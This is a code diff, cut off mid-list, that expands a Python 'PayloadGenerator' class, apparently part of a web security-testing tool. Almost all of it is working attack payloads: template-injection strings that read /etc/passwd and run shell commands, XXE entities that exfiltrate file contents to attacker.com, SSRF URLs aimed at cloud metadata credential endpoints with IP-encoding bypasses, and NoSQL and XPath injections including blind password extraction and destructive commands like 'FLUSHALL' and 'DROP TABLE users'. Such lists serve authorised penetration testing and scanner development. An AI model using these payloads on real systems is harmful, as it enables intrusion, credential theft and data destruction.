@@ -2030,6 +2030,45 @@ class PayloadGenerator:
                 "${{range(1,7)}}${{7*7}}${{end}}",
                 "@(range(1,7))@(7*7)@(end)",
                 "#{ range(1,7) }#{ 7*7 }#{ end }",
+                # Enhanced SSTI payloads with various template engines
+                "{{'7'*7}}",  # Jinja2 string multiplication
+                "${'7'*7}",   # Alternative syntax
+                "{{7**7}}",   # Power operator
+                "${7**7}",
+                "#{7**7}",
+                "{{().__class__}}",  # Class introspection
+                "${().__class__}",
+                "{{''.__class__.__mro__}}",  # Method resolution order
+                "${''.__class__.__mro__}",
+                "{{request}}",  # Request object access
+                "${request}",
+                "{{config}}",   # Config object access
+                "${config}",
+                "{{g}}",        # Global object access
+                "${g}",
+                # Advanced exploitation payloads
+                "{{''.__class__.__mro__[1].__subclasses__()}}",
+                "${''.__class__.__mro__[1].__subclasses__()}",
+                "{{''.__class__.__bases__[0].__subclasses__()}}",
+                "${''.__class__.__bases__[0].__subclasses__()}",
+                # File read attempts
+                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+                "${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}",
+                # Command execution attempts  
+                "{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}",
+                "${''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}",
+                # Environment variable access
+                "{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].environ}}",
+                "${''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].environ}",
+                # Alternative template engines
+                "[% 7*7 %]",      # Template Toolkit
+                "{{ 7*7 }}",      # Mustache/Handlebars  
+                "{% print 7*7 %}", # Django template
+                "<?= 7*7 ?>",     # PHP short tags
+                "{{ 7 * 7 }}",    # With spaces
+                "{{7+7+7+7+7+7+7}}", # Addition instead of multiplication
+                "{{49}}",         # Direct result
+                "${49}",          # Direct result alternative
                 "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                 "${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}",
                 "<%= ''.class.mro[2].subclasses[40]('/etc/passwd').read %>",
@@ -2120,12 +2159,30 @@ class PayloadGenerator:
                 "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\fd\\255"
             ],
             "xxe": [
+                # Basic XXE payloads
                 """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://attacker.com/xxe" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >]><foo>&xxe;</foo>""",
+                # Out-of-band XXE (OOB XXE)
+                """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://attacker.com/xxe" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd" >%xxe;]><foo>&entity;</foo>""",
+                # Blind XXE with parameter entities
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">%eval;%exfiltrate; ]><foo>test</foo>""",
+                # Cloud metadata access
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/instance-id" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/security-credentials/" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data" >]><foo>&xxe;</foo>""",
+                # Google Cloud metadata
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/" >]><foo>&xxe;</foo>""",
+                # Azure metadata
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >]><foo>&xxe;</foo>""",
+                # PHP wrappers
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd" >%xxe;]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://input" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=" >]><foo>&xxe;</foo>""",
+                # Protocol-based XXE
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "ftp://attacker.com/" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "gopher://attacker.com/" >]><foo>&xxe;</foo>""",
@@ -2133,131 +2190,143 @@ class PayloadGenerator:
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "jar://http://attacker.com/evil.jar" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "netdoc://attacker.com/" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "ldap://attacker.com/" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "mailto:attacker@attacker.com" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "text/plain;base64,SGVsbG8sIFdvcmxkIQ==" >]><foo>&xxe;</foo>""",
+                # Local network reconnaissance
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://[::1]/" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:22/" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:80/" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:443/" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:3306/" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://attacker.com/" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:5432/" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:6379/" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:9200/" >]><foo>&xxe;</foo>""",
+                # File system exploration
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/environ" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/version" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/cmdline" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/status" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>""",
                 """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hostname" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/resolv.conf" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/network/interfaces" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/sysconfig/network" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/fstab" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/crontab" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/apache/access.log" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/httpd/access_log" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///usr/local/apache/logs/access.log" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/vsftpd.log" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/sshd.log" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/mail" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/cmdline" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/stat" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/status" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/fd/0" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/fd/1" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/fd/2" >]><foo>&xxe;</foo>""",
-                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/fd/255" >]><foo>&xxe;</foo>"""
+                # Error-based XXE
+                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///nonexistent"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error; ]><foo></foo>""",
+                # Encoding variations
+                """<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
+                """<?xml version="1.0" encoding="UTF-32"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
             ],
             "ssrf": [
+                # Cloud metadata endpoints
                 "http://169.254.169.254/latest/meta-data/",
-                "http://127.0.0.1:22",
-                "http://localhost:3306",
-                "http://[::1]:80",
-                "dict://localhost:11211/stat",
                 "http://169.254.169.254/latest/user-data",
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://169.254.169.254/latest/meta-data/instance-id",
+                "http://169.254.169.254/latest/meta-data/security-credentials/",
+                # Google Cloud metadata
                 "http://metadata.google.internal/computeMetadata/v1/",
+                "http://metadata.google.internal/computeMetadata/v1/instance/",
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "http://metadata.google.internal/computeMetadata/v1/project/",
+                # Azure metadata
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+                # Digital Ocean metadata
                 "http://169.254.169.254/metadata/v1/",
-                "http://100.100.100.200/latest/meta-data/",
-                "http://192.168.0.1:8080/admin",
+                "http://169.254.169.254/metadata/v1/user-data",
+                # Bypass attempts with URL encoding
+                "http://169.254.169.254/latest/meta%2Ddata/",
+                "http://169.254.169.254/latest%2Fmeta-data/",
+                "http://169.254.169.254%2Flatest%2Fmeta-data%2F",
+                # Bypass with different IP representations
+                "http://0x169.0x254.0x169.0x254/latest/meta-data/",
+                "http://2852039166/latest/meta-data/",
+                "http://0xA9FEA9FE/latest/meta-data/",
+                "http://0251.0376.0251.0376/latest/meta-data/",
+                "http://[::ffff:169.254.169.254]/latest/meta-data/",
+                # Local network reconnaissance
+                "http://127.0.0.1:22",
+                "http://127.0.0.1:80",
+                "http://127.0.0.1:443",
+                "http://127.0.0.1:8080",
+                "http://127.0.0.1:3306",
+                "http://127.0.0.1:5432",
+                "http://127.0.0.1:6379",
+                "http://127.0.0.1:9200",
+                "http://127.0.0.1:11211",
+                "http://localhost:22",
+                "http://localhost:3306",
+                "http://localhost:5432",
+                "http://localhost:6379",
+                "http://localhost:9200",
+                # IPv6 localhost
+                "http://[::1]:80",
+                "http://[::1]:22",
+                "http://[::1]:443",
+                "http://[::1]:8080",
+                # Private network ranges
                 "http://192.168.1.1:8080/admin",
+                "http://192.168.0.1:8080/admin",
                 "http://10.0.0.1:8080/admin",
                 "http://172.16.0.1:8080/admin",
-                "http://192.168.10.1:8080/admin",
                 "http://192.168.1.254:8080/admin",
                 "http://192.168.0.254:8080/admin",
                 "http://10.0.0.254:8080/admin",
                 "http://172.16.0.254:8080/admin",
-                "http://192.168.10.254:8080/admin",
-                "http://192.168.1.1:80/admin",
-                "http://192.168.0.1:80/admin",
-                "http://10.0.0.1:80/admin",
-                "http://172.16.0.1:80/admin",
-                "http://192.168.10.1:80/admin",
-                "http://192.168.1.254:80/admin",
-                "http://192.168.0.254:80/admin",
-                "http://10.0.0.254:80/admin",
-                "http://172.16.0.254:80/admin",
-                "http://192.168.10.254:80/admin",
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/root",
-                "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
-                "http://169.254.169.254/openstack/latest/meta_data.json",
-                "http://169.254.169.254/openstack/latest/user_data",
-                "http://169.254.169.254/openstack/2012-08-10/meta_data.json",
-                "http://169.254.169.254/openstack/2012-08-10/user_data",
-                "http://169.254.169.254/2009-04-04/meta-data/",
-                "http://169.254.169.254/2009-04-04/user-data/",
-                "http://169.254.169.254/2009-04-04/meta-data/ami-id",
-                "http://169.254.169.254/2009-04-04/meta-data/reservation-id",
-                "http://169.254.169.254/2009-04-04/meta-data/hostname",
-                "http://169.254.169.254/2009-04-04/meta-data/public-keys/",
-                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/openssh-key",
-                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/comment",
-                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/fingerprint",
-                "http://169.254.169.254/2009-04-04/meta-data/instance-id",
-                "http://169.254.169.254/2009-04-04/meta-data/instance-type",
-                "http://169.254.169.254/2009-04-04/meta-data/local-hostname",
-                "http://169.254.169.254/2009-04-04/meta-data/local-ipv4",
-                "http://169.254.169.254/2009-04-04/meta-data/placement/",
-                "http://169.254.169.254/2009-04-04/meta-data/placement/availability-zone",
-                "http://169.254.169.254/2009-04-04/meta-data/kernel-id",
-                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/",
-                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/ami",
-                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/root",
-                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/ephemeral0",
-                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/swap",
-                "http://169.254.169.254/2009-04-04/meta-data/security-groups",
-                "http://169.254.169.254/2009-04-04/meta-data/public-hostname",
-                "http://169.254.169.254/2009-04-04/meta-data/public-ipv4",
-                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/openssh-key",
-                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/comment",
-                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/fingerprint",
-                "http://169.254.169.254/2009-04-04/user-data",
-                "http://169.254.169.254/2009-04-04/meta-data/",
-                "http://169.254.169.254/2009-04-04/user-data/",
-                "http://169.254.169.254/latest/meta-data/",
-                "http://169.254.169.254/latest/user-data/",
-                "http://169.254.169.254/latest/meta-data/ami-id",
-                "http://169.254.169.254/latest/meta-data/reservation-id",
-                "http://169.254.169.254/latest/meta-data/hostname",
-                "http://169.254.169.254/latest/meta-data/public-keys/",
-                "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
-                "http://169.254.169.254/latest/meta-data/public-keys/0/comment",
-                "http://169.254.169.254/latest/meta-data/public-keys/0/fingerprint",
-                "http://169.254.169.254/latest/meta-data/instance-id",
-                "http://169.254.169.254/latest/meta-data/instance-type",
-                "http://169.254.169.254/latest/meta-data/local-hostname",
-                "http://169.254.169.254/latest/meta-data/local-ipv4",
-                "http://169.254.169.254/latest/meta-data/placement/",
-                "http://169.254.169.254/latest/meta-data/placement/availability-zone",
-                "http://169.254.169.254/latest/meta-data/kernel-id",
-                "http://169.254.169.254/latest/meta-data/block-device-mapping/",
-                "http://169.254.169.254/latest/meta-data/block-device-mapping/ami",
-                "http://169.254.169.254/latest/meta-data/block-device-mapping/root",
-                "http://169.254.169.254/latest/meta-data/block-device-mapping/ephemeral0",
-                "http://169.254.169.254/latest/meta-data/block-device-mapping/swap",
-                "http://169.254.169.254/latest/meta-data/security-groups",
-                "http://169.254.169.254/latest/meta-data/public-hostname",
-                "http://169.254.169.254/latest/meta-data/public-ipv4",
-                "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
-                "http://169.254.169.254/latest/meta-data/public-keys/0/comment",
-                "http://169.254.169.254/latest/meta-data/public-keys/0/fingerprint",
-                "http://169.254.169.254/latest/user-data"
+                # Different protocols
+                "dict://localhost:11211/stat",
+                "gopher://localhost:11211/",
+                "ftp://localhost/",
+                "ldap://localhost/",
+                "sftp://localhost/",
+                # File protocol attempts
+                "file:///etc/passwd",
+                "file:///c:/windows/system32/drivers/etc/hosts",
+                # Bypass with redirects
+                "http://redirect.attacker.com/redirect-to-metadata",
+                "http://attacker.com/redirect?url=http://169.254.169.254/",
+                # DNS rebinding attacks
+                "http://a.b.c.d.attacker.com/",
+                "http://169.254.169.254.attacker.com/",
+                # Time-based SSRF detection
+                "http://httpbin.org/delay/5",
+                "http://httpbin.org/status/500",
+                # Different encoding bypasses
+                "http://0177.0376.0251.0376/latest/meta-data/",  # Octal encoding
+                "http://2130706433/latest/meta-data/",  # Decimal encoding for 127.0.0.1
+                "http://017700000001/latest/meta-data/",  # Octal for 127.0.0.1
+                "http://0x7F000001/latest/meta-data/",  # Hex for 127.0.0.1
+                # Short IP notations
+                "http://127.1/",
+                "http://127.001/",
+                "http://127.0.1/",
+                "http://0/",
+                "http://0.0.0.0/",
+                # Wildcard DNS
+                "http://0.0.0.0.xip.io/",
+                "http://127.0.0.1.xip.io/",
+                "http://169.254.169.254.xip.io/",
+                # Application-specific endpoints
+                "http://localhost:8500/v1/catalog/nodes",  # Consul
+                "http://localhost:2379/v2/keys",  # etcd
+                "http://localhost:8001/api/v1/namespaces",  # Kubernetes API
+                "http://localhost:5000/v2/_catalog",  # Docker Registry
+                "http://localhost:9000/minio/admin/v1/info",  # MinIO
+                # Jenkins endpoints
+                "http://localhost:8080/script",
+                "http://localhost:8080/manage",
+                "http://localhost:8080/computer/",
+                # ElasticSearch
+                "http://localhost:9200/_cat/indices",
+                "http://localhost:9200/_cluster/health",
+                # Prometheus
+                "http://localhost:9090/api/v1/query",
+                "http://localhost:9090/metrics",
+                # Grafana
+                "http://localhost:3000/api/admin/users",
+                # Additional common internal services
+                "http://localhost:4369/",  # Erlang Port Mapper
+                "http://localhost:5984/_all_dbs",  # CouchDB
+                "http://localhost:7001/",  # Cassandra
+                "http://localhost:27017/",  # MongoDB
+                "http://localhost:5672/",  # RabbitMQ
+                "http://localhost:15672/",  # RabbitMQ Management
             ],
             "ldap_injection": [
                 "*)(uid=*))(|(uid=*",
@@ -2292,93 +2361,183 @@ class PayloadGenerator:
                 "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*"
             ],
             "nosql_injection": [
+                # MongoDB $where operator injections
                 "true, $where: '1 == 1'",
                 ", $where: '1 == 1'",
                 "$where: '1 == 1'",
                 "', $where: '1 == 1'",
                 "1, $where: '1 == 1'",
-                "admin'--",
-                "admin' #",
-                "admin'/*",
-                "admin' or '1'='1",
-                "admin' or '1'='1'--",
-                "admin' or '1'='1'#",
-                "admin' or '1'='1'/*",
-                "admin'or 1=1 or ''='",
-                "admin' or 1=1",
-                "admin' or 1=1--",
-                "admin' or 1=1#",
-                "admin' or 1=1/*",
-                "admin') or ('1'='1",
-                "admin') or ('1'='1'--",
-                "admin') or ('1'='1'#",
-                "admin') or ('1'='1'/*",
-                "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
-                "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
+                "$where: 'this.password.match(/.*/) return true'",
+                "$where: 'this.username.match(/.*/) return true'",
+                "$where: 'return true'",
+                "$where: 'sleep(5000) || true'",
+                # MongoDB operator injection
+                "{'$ne': null}",
+                "{'$ne': ''}",
+                "{'$regex': '.*'}",
+                "{'$regex': '^.*'}",
+                "{'$gt': ''}",
+                "{'$gte': ''}",
+                "{'$lt': 'z'}",
+                "{'$lte': 'z'}",
+                "{'$exists': true}",
+                "{'$not': {'$size': 0}}",
+                "{'$nin': ['']}",
+                "{'$in': [null, '', 1, true]}",
+                # JSON format injections
+                '{"$ne": null}',
+                '{"$ne": ""}',
+                '{"$regex": ".*"}',
+                '{"$gt": ""}',
+                '{"$exists": true}',
+                '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
+                '{"$where": "1==1"}',
+                '{"$where": "return true"}',
+                '{"$where": "this.username == \\"admin\\""}',
+                # URL encoded versions
+                "%7B%22%24ne%22%3A%20null%7D",  # {"$ne": null}
+                "%7B%22%24regex%22%3A%20%22.*%22%7D",  # {"$regex": ".*"}
+                "%7B%22%24gt%22%3A%20%22%22%7D",  # {"$gt": ""}
+                # Array format attacks
+                "[$ne]=",
+                "[$regex]=.*",
+                "[$gt]=",
+                "[$exists]=true",
+                "[$where]=1==1",
+                "[$or][0][username]=admin",
+                "[$or][1][username]=administrator",
+                # Blind injection techniques
+                "admin' && this.password.match(/^a.*/) && '1'=='1",
+                "admin' && this.password.match(/^b.*/) && '1'=='1",
+                "admin' && this.password.match(/^c.*/) && '1'=='1",
+                "admin' && this.password.match(/^d.*/) && '1'=='1",
+                "admin' && this.password.match(/^e.*/) && '1'=='1",
+                "admin' && this.password.match(/^f.*/) && '1'=='1",
+                "admin' && this.password.match(/^[0-9].*/) && '1'=='1",
+                # Time-based injections
+                "admin'; sleep(5000); var x='",
+                "admin' && sleep(5000) && '1'=='1",
+                "$where: 'sleep(5000) || true'",
+                "admin'; while(true); var x='",
+                # Error-based injections
+                "admin'; return 1/0; var x='",
+                "admin' && this.nonexistent.field && '1'=='1",
+                "$where: 'throw new Error(this.password)'",
+                "$where: 'return this.password'",
+                # CouchDB specific
+                "_all_docs",
+                "_design/",
+                "_changes",
+                "_stats",
+                "_config",
+                # Redis specific (when applicable)
+                "*",
+                "?",
+                "FLUSHALL",
+                "CONFIG GET *",
+                "INFO",
+                # Cassandra specific
+                "' OR 1=1 ALLOW FILTERING;--",
+                "'; DROP TABLE users;--",
+                # Alternative bypass attempts
+                "admin'||''=='",
+                "admin'||1==1||'",
+                "admin'&&''=='",
+                "admin'&&1==1&&'",
             ],
             "xpath_injection": [
+                # Basic boolean-based injections
                 "' or '1'='1",
+                "' or 1=1 or '",
                 "' or ''='",
                 "x' or 1=1 or 'x'='y",
+                ") or 1=1 or (",
+                ")] | //users[(*",
+                "' or 1=1]%00",
+                # Node traversal
                 "/descendant-or-self::node()",
-                "']*|",
+                "/*",
+                "//*",
+                "//comment()",
+                "//text()",
+                "//processing-instruction()",
+                # Axis-based injections
                 "' or position()=1 or '",
+                "' or last()=1 or '",
                 "' or count(/descendant::*)>0 or '",
                 "' or count(//*)>0 or '",
                 "' or count(/child::*)>0 or '",
+                "' or count(ancestor::*)>0 or '",
+                "' or count(following::*)>0 or '",
+                "' or count(preceding::*)>0 or '",
+                # String and name functions
                 "' or string-length(name(/*[1]))>0 or '",
-                "' or contains(name(/*[1]),'A') or '",
-                "' or contains(name(/*[1]),'B') or '",
-                "' or contains(name(/*[1]),'C') or '",
-                "' or contains(name(/*[1]),'D') or '",
-                "' or contains(name(/*[1]),'E') or '",
